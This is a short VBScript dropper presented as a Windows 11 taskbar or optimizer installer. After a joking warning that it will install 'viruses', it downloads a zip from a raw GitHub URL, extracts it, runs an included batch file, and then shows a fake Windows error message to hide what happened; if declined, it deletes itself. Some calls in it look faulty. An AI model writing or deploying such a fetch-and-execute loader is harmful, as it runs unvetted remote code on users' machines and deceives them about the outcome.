MsgBox "!Last Warn Blud!"

response = MsgBox("Hey this .vbs file will install some files and viruses continue? (I'm not responsible)", vbYesNo, "Warning")

If response = vbYes Then
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objXMLHTTP.open "GET", "https://raw.githubusercontent.com/monkebutcool/UserScripts/main/win11taskbar.zip", False
    objXMLHTTP.send()

    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile "win11taskbar.zip"
        objADOStream.Close

        Set objShell = CreateObject("Shell.Application")
        objShell.NameSpace("win11taskbar").CopyHere objShell.NameSpace("win11taskbar.zip").Items

        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "win11optimizer.bat", 1, True

        MsgBox "Unknown error loading VisualBasic module for Windows 11.", vbCritical,vbOKOnly, "Windows"
    End If
Else
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    objFSO.DeleteFile WScript.ScriptFullName
End If
